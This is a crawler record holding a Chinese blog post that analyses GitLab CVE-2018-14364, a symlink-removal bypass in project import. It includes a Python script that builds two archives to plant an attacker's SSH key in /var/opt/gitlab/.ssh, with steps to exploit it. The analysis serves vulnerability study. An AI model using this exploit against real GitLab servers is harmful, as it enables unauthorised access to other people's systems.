{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-20 19:52:53","updatedTime":"2020-10-20 19:52:53","title":"GitLab远程代码执行漏洞分析 -【CVE-2018-14364】","link":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","description":"<p><a href=\"https://xz.aliyun.com/t/2661\" target=\"_blank\" rel=\"external\">GitLab远程代码执行漏洞分析 -【CVE-2018-14364】</a></p> \n<a id=\"more\"></a> \n<h1 id=\"漏洞公告\"><a href=\"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/#漏洞公告\" class=\"headerlink\" title=\"漏洞公告\"></a>漏洞公告</h1>\n<p>2018年7月17日，Gitlab官方发布安全更新版本，修复了一个<a href=\"https://about.gitlab.com/2018/07/17/critical-security-release-gitlab-11-dot-0-dot-4-released/\" target=\"_blank\" rel=\"external\">远程命令执行漏洞</a>，CVE ID为CVE-2018-14364，该漏洞由长亭研究人员发现，并在<a href=\"https://hackerone.com/reports/378148\" target=\"_blank\" rel=\"external\">hackerone平台</a>提交</p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191947-7061390a-ab7d-1.png\" alt=\"1.jpg\" /></p> \n<p>影响版本：&gt;= 8.9.0<br>修复版本：11.0.4, 10.8.6, and 10.7.7</br></p> \n<h1 id=\"漏洞分析\"><a href=\"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1>\n<p>以版本11.0.3为例。根据<a href=\"https://gitlab.com/gitlab-org/gitlab-ce/compare/v11.0.3...v11.0.4\" target=\"_blank\" rel=\"external\">版本源码对比</a></p> \n<p>从CHANGELOG.md中得知为<code>Fix symlink vulnerability in project import</code></p> \n<p>主要修改的代码文件为lib/gitlab/import_export/file_importer.rb</p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-707e9eb4-ab7d-1.png\" alt=\"2.jpg\" /></p> \n<p>主要关注一下<code>extracted_files</code>。</p> \n<p>当我们import一个项目时，会进入到<code>file_import.rb</code>。然后调用第17行的：<br>\n  <figure class=\"highlight ruby\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre>\n       <div class=\"line\">\n        1\n       </div>\n       <div class=\"line\">\n        2\n       </div>\n       <div class=\"line\">\n        3\n       </div>\n       <div class=\"line\">\n        4\n       </div>\n       <div class=\"line\">\n        5\n       </div>\n       <div class=\"line\">\n        6\n       </div>\n       <div class=\"line\">\n        7\n       </div>\n       <div class=\"line\">\n        8\n       </div>\n       <div class=\"line\">\n        9\n       </div>\n       <div class=\"line\">\n        10\n       </div>\n       <div class=\"line\">\n        11\n       </div>\n       <div class=\"line\">\n        12\n       </div>\n       <div class=\"line\">\n        13\n       </div>\n       <div class=\"line\">\n        14\n       </div></pre></td>\n     <td class=\"code\"><pre>\n       <div class=\"line\">\n        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">import</span></span>\n       </div>\n       <div class=\"line\">\n            mkdir_p(@shared.export_path)\n       </div>\n       <div class=\"line\"></div>\n       <div class=\"line\">\n            remove_symlinks!\n       </div>\n       <div class=\"line\"></div>\n       <div class=\"line\">\n            wait_for_archived_file \n        <span class=\"keyword\">do</span>\n       </div>\n       <div class=\"line\">\n                decompress_archive\n       </div>\n       <div class=\"line\">     \n        <span class=\"keyword\">end</span>\n       </div>\n       <div class=\"line\">\n        <span class=\"keyword\">rescue</span> =&gt; e\n       </div>\n       <div class=\"line\">\n            @shared.error(e)\n       </div>\n       <div class=\"line\">    \n        <span class=\"literal\">false</span>\n       </div>\n       <div class=\"line\">\n        <span class=\"keyword\">ensure</span>\n       </div>\n       <div class=\"line\">\n            remove_symlinks!    \n       </div>\n       <div class=\"line\">\n        <span class=\"keyword\">end</span>\n       </div></pre></td>\n    </tr>\n   </table>\n  </figure></br></p> \n<p><code>remove_symlinks</code>用于删除导入文件中存在的符号链接。此前gitlab就因为符号链接的问题爆出过多个RCE问题，因此在这里做了检查：<br>\n  <figure class=\"highlight ruby\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre>\n       <div class=\"line\">\n        1\n       </div>\n       <div class=\"line\">\n        2\n       </div>\n       <div class=\"line\">\n        3\n       </div>\n       <div class=\"line\">\n        4\n       </div>\n       <div class=\"line\">\n        5\n       </div>\n       <div class=\"line\">\n        6\n       </div>\n       <div class=\"line\">\n        7\n       </div></pre></td>\n     <td class=\"code\"><pre>\n       <div class=\"line\">\n        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove_symlinks!</span></span>\n       </div>\n       <div class=\"line\">\n            extracted_files.each \n        <span class=\"keyword\">do</span> \n        <span class=\"params\">|path|</span>\n       </div>\n       <div class=\"line\">\n               FileUtils.rm(path) \n        <span class=\"keyword\">if</span> File.lstat(path).symlink?\n       </div>\n       <div class=\"line\">    \n        <span class=\"keyword\">end</span>\n       </div>\n       <div class=\"line\"></div>\n       <div class=\"line\">    \n        <span class=\"literal\">true</span>\n       </div>\n       <div class=\"line\">\n        <span class=\"keyword\">end</span>\n       </div></pre></td>\n    </tr>\n   </table>\n  </figure></br></p> \n<p>而<code>extracted_files</code>定义在61行，这个方法用于列出解压出来的所有文件。<br>\n  <figure class=\"highlight ruby\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre>\n       <div class=\"line\">\n        1\n       </div>\n       <div class=\"line\">\n        2\n       </div>\n       <div class=\"line\">\n        3\n       </div></pre></td>\n     <td class=\"code\"><pre>\n       <div class=\"line\">\n        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">extracted_files</span></span>\n       </div>\n       <div class=\"line\">\n            Dir.glob(\n        <span class=\"string\">\"<span class=\"subst\">#{@shared.export_path}</span>/**/*\"</span>, File::FNM_DOTMATCH).reject { \n        <span class=\"params\">|f|</span> f =~ \n        <span class=\"regexp\">%r{.*/\\.{1,2}</span>$} }\n       </div>\n       <div class=\"line\">\n        <span class=\"keyword\">end</span>\n       </div></pre></td>\n    </tr>\n   </table>\n  </figure></br></p> \n<p>在<a href=\"https://ruby-doc.org/core-2.5.1/Regexp.html\" target=\"_blank\" rel=\"external\">ruby</a>中,关于正则表达式的符号定义如下：</p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70a75304-ab7d-1.png\" alt=\"3.jpg\" /></p> \n<p>也就是说<code>%r{.*/\\.{1,2}$}</code>这个正则表达式最后的<code>$</code>只能匹配到一行的末尾（Matches end of line），而不是整个字符串的末尾（Matches end of string）。</p> \n<p>根据<a href=\"http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap03.html#tag_03_169\" target=\"_blank\" rel=\"external\">POSIX 标准</a>，对于文件名（filename）除了slash character<code>/</code>和null byte <code>NULL</code>外，其余字符均可以：</p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70d2d358-ab7d-1.png\" alt=\"4.jpg\" /></p> \n<p>所以只要创建一个名字以<code>\\n</code>开头的符号链接文件，就无法被<code>extracted_files</code>列出。</p> \n<p>回到<a href=\"https://gitlab.com/gitlab-org/gitlab-ce/compare/v11.0.3...v11.0.4\" target=\"_blank\" rel=\"external\">版本源码对比</a>，在测试文件file_importer_spec.rb里：</p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70fb58d2-ab7d-1.png\" alt=\"5.jpg\" /></p> \n<p>因此构建测试环境：<br>\n  <figure class=\"highlight ruby\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre>\n       <div class=\"line\">\n        1\n       </div>\n       <div class=\"line\">\n        2\n       </div>\n       <div class=\"line\">\n        3\n       </div>\n       <div class=\"line\">\n        4\n       </div>\n       <div class=\"line\">\n        5\n       </div>\n       <div class=\"line\">\n        6\n       </div>\n       <div class=\"line\">\n        7\n       </div>\n       <div class=\"line\">\n        8\n       </div>\n       <div class=\"line\">\n        9\n       </div>\n       <div class=\"line\">\n        10\n       </div></pre></td>\n     <td class=\"code\"><pre>\n       <div class=\"line\">\n        <span class=\"keyword\">require</span> \n        <span class=\"string\">\"tmpdir\"</span>\n       </div>\n       <div class=\"line\">\n        puts \n        <span class=\"string\">\"The temp dir is: <span class=\"subst\">#{Dir.tmpdir}</span>\"</span>\n       </div>\n       <div class=\"line\"></div>\n       <div class=\"line\">\n        export_path=\n        <span class=\"string\">\"<span class=\"subst\">#{Dir.tmpdir}</span>/file_importer\"</span>\n       </div>\n       <div class=\"line\">\n        evil_symlink_file=\n        <span class=\"string\">\"<span class=\"subst\">#{export_path}</span>/.\\nevil\"</span>\n       </div>\n       <div class=\"line\">\n        valid_file=\n        <span class=\"string\">\"<span class=\"subst\">#{export_path}</span>/valid.json\"</span>\n       </div>\n       <div class=\"line\"></div>\n       <div class=\"line\">\n        FileUtils.mkdir_p(\n        <span class=\"string\">\"<span class=\"subst\">#{export_path}</span>/subfolder/\"</span>)\n       </div>\n       <div class=\"line\">\n        FileUtils.touch(valid_file)\n       </div>\n       <div class=\"line\">\n        FileUtils.ln_s(valid_file, evil_symlink_file)\n       </div></pre></td>\n    </tr>\n   </table>\n  </figure></br></p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-711ddbd2-ab7d-1.png\" alt=\"6.jpg\" /></p> \n<p>可以看到原本的正则表达式是无法检测到<code>\\nevil</code>文件的：</p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-713cc3ee-ab7d-1.png\" alt=\"7.jpg\" /></p> \n<h1 id=\"利用过程\"><a href=\"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/#利用过程\" class=\"headerlink\" title=\"利用过程\"></a>利用过程</h1>\n<p>提供一下压缩包生成脚本：<br>\n  <figure class=\"highlight python\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre>\n       <div class=\"line\">\n        1\n       </div>\n       <div class=\"line\">\n        2\n       </div>\n       <div class=\"line\">\n        3\n       </div>\n       <div class=\"line\">\n        4\n       </div>\n       <div class=\"line\">\n        5\n       </div>\n       <div class=\"line\">\n        6\n       </div>\n       <div class=\"line\">\n        7\n       </div>\n       <div class=\"line\">\n        8\n       </div>\n       <div class=\"line\">\n        9\n       </div>\n       <div class=\"line\">\n        10\n       </div>\n       <div class=\"line\">\n        11\n       </div>\n       <div class=\"line\">\n        12\n       </div>\n       <div class=\"line\">\n        13\n       </div>\n       <div class=\"line\">\n        14\n       </div>\n       <div class=\"line\">\n        15\n       </div>\n       <div class=\"line\">\n        16\n       </div>\n       <div class=\"line\">\n        17\n       </div>\n       <div class=\"line\">\n        18\n       </div>\n       <div class=\"line\">\n        19\n       </div>\n       <div class=\"line\">\n        20\n       </div>\n       <div class=\"line\">\n        21\n       </div>\n       <div class=\"line\">\n        22\n       </div>\n       <div class=\"line\">\n        23\n       </div>\n       <div class=\"line\">\n        24\n       </div>\n       <div class=\"line\">\n        25\n       </div>\n       <div class=\"line\">\n        26\n       </div>\n       <div class=\"line\">\n        27\n       </div></pre></td>\n     <td class=\"code\"><pre>\n       <div class=\"line\">\n        <span class=\"keyword\">import</span> os\n       </div>\n       <div class=\"line\">\n        <span class=\"keyword\">import</span> shutil\n       </div>\n       <div class=\"line\"></div>\n       <div class=\"line\">\n        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">step_one</span><span class=\"params\">()</span>:</span>\n       </div>\n       <div class=\"line\">\n                os.chdir(uploads_dir)\n       </div>\n       <div class=\"line\">\n                gitlab_dir = \n        <span class=\"string\">\"/var/opt/gitlab\"</span>\n       </div>\n       <div class=\"line\">\n                evil_symlink_name = \n        <span class=\"string\">\".\\nevil\"</span>\n       </div>\n       <div class=\"line\">\n                os.symlink(gitlab_dir, evil_symlink_name)\n       </div>\n       <div class=\"line\">\n                os.chdir(exp_dir)\n       </div>\n       <div class=\"line\">\n                os.system(\n        <span class=\"string\">\"tar -czf ../step1.tar.gz  . &amp;&amp; rm -r uploads &amp;&amp; mkdir uploads\"</span>)\n       </div>\n       <div class=\"line\"></div>\n       <div class=\"line\">\n        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">step_two</span><span class=\"params\">()</span>:</span>\n       </div>\n       <div class=\"line\">\n                os.chdir(uploads_dir)\n       </div>\n       <div class=\"line\">\n                evil_ssh_dir_name = \n        <span class=\"string\">\".\\nevil/.ssh\"</span>\n       </div>\n       <div class=\"line\">\n                os.makedirs(evil_ssh_dir_name)\n       </div>\n       <div class=\"line\">\n                evil_dir = os.getcwd() + \n        <span class=\"string\">\"/\"</span> + evil_ssh_dir_name\n       </div>\n       <div class=\"line\">\n                os.chdir(evil_dir)\n       </div>\n       <div class=\"line\">\n                shutil.copy(authorized_keys,\n        <span class=\"string\">\"authorized_keys\"</span>)\n       </div>\n       <div class=\"line\">\n                os.chdir(exp_dir)\n       </div>\n       <div class=\"line\">\n                os.system(\n        <span class=\"string\">\"tar -czf ../step2.tar.gz  . &amp;&amp; rm -r uploads &amp;&amp; mkdir uploads\"</span>)\n       </div>\n       <div class=\"line\"></div>\n       <div class=\"line\">\n        <span class=\"keyword\">if</span> __name__ == \n        <span class=\"string\">'__main__'</span>:\n       </div>\n       <div class=\"line\">\n                uploads_dir = os.getcwd() + \n        <span class=\"string\">\"/evil/uploads\"</span>\n       </div>\n       <div class=\"line\">\n                exp_dir = os.getcwd() + \n        <span class=\"string\">\"/evil\"</span>\n       </div>\n       <div class=\"line\">\n                authorized_keys = os.getcwd() + \n        <span class=\"string\">\"/key.pub\"</span>\n       </div>\n       <div class=\"line\">\n                step_one()\n       </div>\n       <div class=\"line\">\n                step_two()\n       </div></pre></td>\n    </tr>\n   </table>\n  </figure></br></p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-715755c4-ab7d-1.png\" alt=\"13.jpg\" /></p> \n<p>key.pub里保存公钥。其余文件见文末附件压缩包。</p> \n<p>创建项目project ，选择<code>Import project</code>后选择<code>Import an exported GitLab project</code></p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-7173be94-ab7d-1.png\" alt=\"8.jpg\" /></p> \n<p>待导入成功后，如下图：</p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71a2d4d6-ab7d-1.png\" alt=\"9.jpg\" /></p> \n<p>注意此时的项目名为<code>test</code>，同时右下角有一个<code>Remove project</code>，点击删除掉project，然而此时在gitlab的目录下，<code>test</code>还没有被删除。</p> \n<p>新建一个project，仍然采用<code>Import an exported GitLab project</code>，然后上传第二个压缩包</p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71c0a5ce-ab7d-1.png\" alt=\"11.jpg\" /></p> \n<p>第二个压缩包的内容如下，<code>\\nevil</code>是目录名<br>\n  <figure class=\"highlight plain\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre>\n       <div class=\"line\">\n        1\n       </div>\n       <div class=\"line\">\n        2\n       </div>\n       <div class=\"line\">\n        3\n       </div>\n       <div class=\"line\">\n        4\n       </div>\n       <div class=\"line\">\n        5\n       </div>\n       <div class=\"line\">\n        6\n       </div></pre></td>\n     <td class=\"code\"><pre>\n       <div class=\"line\">\n        VERSION\n       </div>\n       <div class=\"line\">\n        project.json\n       </div>\n       <div class=\"line\">\n        uploads/\n       </div>\n       <div class=\"line\">\n        uploads/.\\nevil/\n       </div>\n       <div class=\"line\">\n        uploads/.\\nevil/.ssh/\n       </div>\n       <div class=\"line\">\n        uploads/.\\nevil/.ssh/authorized_keys\n       </div></pre></td>\n    </tr>\n   </table>\n  </figure></br></p> \n<p>gitlab在解压第二个压缩包时，会尝试往目录<code>\\nevil</code>里写入<code>.ssh/authorized_keys</code>，而由于上一步的符号链接<code>\\nevil</code>没有删除，所以实际写入的目录是<code>/var/opt/gitlab/.ssh/authorized_keys</code></p> \n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71ea8628-ab7d-1.png\" alt=\"12.jpg\" /></p> \n<p>可以看到<code>authorized_keys</code>已经被写入了公钥。此后用用户名git和公钥对应的私钥直接ssh连接服务器即可。</p> \n<h1 id=\"Reference\"><a href=\"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/#Reference\" class=\"headerlink\" title=\"Reference\"></a>Reference</h1>\n<ul> \n <li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14364\" target=\"_blank\" rel=\"external\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14364</a></li> \n</ul>","descriptionType":"html","publishedDate":"Mon, 10 Sep 2018 00:04:23 +0000","feedId":30884,"bgimg":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191947-7061390a-ab7d-1.png","linkMd5":"322ea70f227c139833b95e7cdc65ae81","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn71@2020_4/2020/10/20/11-52-58-793_5cef2b9d8ffe33a6.webp","destWidth":1007,"destHeight":380,"sourceBytes":281725,"destBytes":86006,"author":"","articleImgCdnMap":{"https://xzfile.aliyuncs.com/media/upload/picture/20180829191947-7061390a-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn71@2020_4/2020/10/20/11-52-58-793_5cef2b9d8ffe33a6.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-707e9eb4-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn95@2020_3/2020/10/20/11-53-05-294_34796b626d05d45b.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70a75304-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn92@2020_6/2020/10/20/11-53-06-620_140195e1ed6327f4.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70d2d358-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn8@2020_2/2020/10/20/11-53-07-821_cd8205c1835c0813.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70fb58d2-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn12@2020_3/2020/10/20/11-53-07-491_94bd68a9dd39bb7b.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-711ddbd2-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn3@2020_1/2020/10/20/11-53-06-937_d11daacd3c5d8553.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-713cc3ee-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn76@2020_3/2020/10/20/11-53-05-558_da66354b7c904337.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-715755c4-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn84@2020_2/2020/10/20/11-54-05-548_8b6eab1d1b9c086c.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-7173be94-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn87@2020_3/2020/10/20/11-53-04-030_c1ebe391cd8dca8f.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71a2d4d6-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn15@2020_6/2020/10/20/11-53-08-239_bd725a510707174b.webp","https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71c0a5ce-ab7d-1.png":null,"https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71ea8628-ab7d-1.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn100@2020_3/2020/10/20/11-53-08-095_ff2b179229068f63.webp"},"publishedOrCreatedDate":1603194773024}],"record":{"createdTime":"2020-10-20 19:52:53","updatedTime":"2020-10-20 19:52:53","feedId":30884,"fetchDate":"Tue, 20 Oct 2020 11:52:53 +0000","fetchMs":180,"handleMs":37,"totalMs":73846,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"80d50a82a463017eede47e80eb3f5c35","hostName":"us-035*","requestId":"508d2eec388c4d13936c664b533a9155_30884","contentType":"application/xml","totalBytes":872120,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":12,"articlesImgsGithubTotal":11,"successGithubMap":{"myreaderx8":1,"myreaderx25":1,"myreaderx7":1,"myreaderx21":1,"myreaderx10":1,"myreaderx33":1,"myreaderx13":1,"myreaderx24":1,"myreaderx30":1,"myreaderx5oss":1,"myreaderx18":1},"failGithubMap":{"myreaderx14":1}},"feed":{"createdTime":"2020-09-07 02:51:03","updatedTime":"2020-09-07 04:58:07","id":30884,"name":"Chybeta","url":"https://chybeta.github.io/atom.xml","subscriber":104,"website":null,"icon":"http://chybeta.github.io/favicon.ico?v=5.1.0","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn36@2020_5/2020/09/06/20-58-06-242_68b9b22daa1d74c5.ico","description":"","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-10-20 19:54:06","updatedTime":"2020-10-20 19:54:06","id":null,"feedId":30884,"linkMd5":"322ea70f227c139833b95e7cdc65ae81"}],"tmpCommonImgCdnBytes":86006,"tmpBodyImgCdnBytes":786114,"tmpBgImgCdnBytes":0,"extra4":{"start":1603194772798,"total":0,"statList":[{"spend":189,"msg":"获取xml内容"},{"spend":37,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":66773,"msg":"正文链接上传到cdn"}]},"extra5":12,"extra6":12,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71c0a5ce-ab7d-1.png","sourceStatusCode":200,"destWidth":1439,"destHeight":431,"sourceBytes":141978,"destBytes":70842,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":7301,"convertSpendMs":47,"createdTime":"2020-10-20 19:52:59","host":"europe-59*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn78/contents/2020/10/20/11-53-06-690_9717bc5cf72088c6.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Tue, 20 Oct 2020 11:53:07 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["AD9A:0ED8:14DAF81:1837670:5F8ECF9D"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1603194924"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn78/contents/2020/10/20/11-53-06-690_9717bc5cf72088c6.webp","historyStatusCode":[],"spendMs":593},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"138.7 KB","destSize":"69.2 KB","compressRate":"49.9%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71c0a5ce-ab7d-1.png","sourceStatusCode":200,"destWidth":1439,"destHeight":431,"sourceBytes":141978,"destBytes":70842,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":4525,"convertSpendMs":69,"createdTime":"2020-10-20 19:53:07","host":"europe-58*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn78/contents/2020/10/20/11-53-11-516_9717bc5cf72088c6.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Tue, 20 Oct 2020 11:53:11 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["E29C:DBD8:6F74B87:812E2EF:5F8ECFA2"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1603194924"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn78/contents/2020/10/20/11-53-11-516_9717bc5cf72088c6.webp","historyStatusCode":[],"spendMs":357},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"138.7 KB","destSize":"69.2 KB","compressRate":"49.9%"},null],"extra10_invalidATagHrefValue":{"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/_#漏洞公告":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/#漏洞公告","http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/_#Reference":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/#Reference","http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/_#利用过程":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/#利用过程","http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/_#漏洞分析":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/#漏洞分析"},"extra111_proxyServerAndStatMap":{"http://europe-25.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-037.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-004.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe63.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-58.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-59.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-028.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-51.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-016.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-024.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-012.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191947-7061390a-ab7d-1.png","sourceStatusCode":200,"destWidth":1007,"destHeight":380,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn71@2020_4/2020/10/20/11-52-58-793_5cef2b9d8ffe33a6.webp","sourceBytes":281725,"destBytes":86006,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":6829,"convertSpendMs":38,"createdTime":"2020-10-20 19:52:53","host":"us-008*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81,322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"275.1 KB","destSize":"84 